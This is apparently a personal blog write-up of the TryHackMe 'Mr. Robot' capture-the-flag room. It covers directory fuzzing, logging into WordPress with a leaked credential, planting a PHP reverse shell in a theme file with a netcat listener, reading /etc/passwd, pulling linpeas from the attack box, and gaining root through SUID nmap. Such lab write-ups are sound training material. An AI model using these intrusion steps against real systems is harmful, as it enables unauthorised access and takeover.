---
layout: post
title: 'THM: Mr. Robot | Write-up'
date: '2024-11-12 05:59:33 +0000'
categories: [THM]
tags: [thm, web, fuzzing, privilege escalation, reverse shell, exploitation, enumeration]
comments: false
image: /post-imgs/mr-robot-writeup/mr-robot.jpg
---

## Overview

Mr Robot is a room on TryHackMe inspired by the <b><i>Mr. Robot</i></b> TV series. This room introduces players to the fundamentals of penetration testing through a sequence of tasks including, enumeration, exploitation, and privilege escalation.
<br><br>
In this room, we're required to find 3 flags. Let's get started! <br>

![haxor](/haxorman.gif)
<br>

## Enumeration

Let's start with a typical nmap scan. 

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-1.png)

Scanning the target with Nmap reveals three open TCP ports. On port 22 SSH is running, on port 80, an Apache web server, and an Apache web server with SSL on port 443. We can begin enumerating the subdomains of the web server on port 80 by fuzzing. I used ffuf. <br>
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target ip>/FUZZ -t 100`

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-2.png)

From the output, we see a lot of interesting directories. Since I fell into a rabbit hole, I will only be showing directories that are relevant in getting the flags.

/robots.txt gave us the first flag and a wordlist. (Reading through the wordlist, it seems to me that it was intended to be used for fuzzing directories, I didn't use it but you can try fuzzing using this wordlist.)

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-3.png)

You can download these files using wget. 

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-4.png)
<br>
![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-5.png)

Heading over to /license shows us a string encoded in base64. Decoding this will give us a credential to somewhere. (I censored it so you can try doing this process yourself).

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-6.png) 
![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-7.png)

In /wp-login we found a wordpress login page. Let's try logging in using the credentials we found earlier.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-8.png)

We're in. :)

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-9.png)

## Exploitation

Head over to Appearance > Editor > Footer.php ( You can also try to find and test each template file and see which files will work for our reverse shell.)

If you're unsure which reverse shell you're going to use, download or copy [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Just make sure to change the ip and port accordingly. Replace the code in the template file with the reverse shell and click update changes. 

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-10.png)

Now setup a netcat listener on your attack box. `nc -nvlp <port>`

Execute the reverse shell by accessing the template file in the url field.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-11.png)

Go back to your attack box.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-12.png)

We're in :)(2). Now we can do local enumeration and look for flags. <br>

Looking into the users of this system `cat /etc/passwd` we found a user with higher privilege.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-13.png)

We found the 2nd flag on /home/robot directory but unfortunately with can't access it using this account. We also found a credential for the user robot. (I didn't crack this hash instead I went straight to getting root.) 

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-14.png)<br>
![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-15.png)

## Privilege Escalation

We can use [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855) to further enumerate the machine for possible privilege escalation attack vectors. <br>

Setup a python server hosting the directory containing linpeas.sh. 
![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-16.png)

On the target machine, download the linpeas.sh file into the /tmp directory using wget. <br> `wget http://<attack-box-ip>/linpeas.sh` <br>
Give the file executable permissions and run it. <br>
![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-17.png)

Looking through the linpeas output, we found some interesting binaries with SUID bit set that has root permissions. 

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-18.png)

Alternatively, you can use the following command to look for binaries that can run commands as root.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-19.png)

Now, we will be focusing on the binary Nmap. Head over to [GTFOBins](https://gtfobins.github.io/) and search nmap. In the Shell section, we can see that Nmap versions 2.02 to 5.21 has an interactive mode.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-20.png)

Let's check the version of the nmap on the target machine.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-21.png)

It's still in range. We can now run the command above and see if we can get a root shell. In the Nmap interactive mode, you need to add an exclamation mark before the command.

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-22.png){: height="100" width="200" }

We're in :)(3). Now, that we're root, we can now access the 2nd flag located in /home/robot and the 3rd flag in /root. The cd command isn't available in the interactive mode so we will be using the ls command and cat command to access the flag files. I won't be showing the flags to not spoil it for you. 

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-23.png){: height="100" width="200" }<br>
![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-24.png){: height="100" width="200" }<br>

![mr-robot](/post-imgs/mr-robot-writeup/mrrobot-werein.gif){: height="500" width="500" }
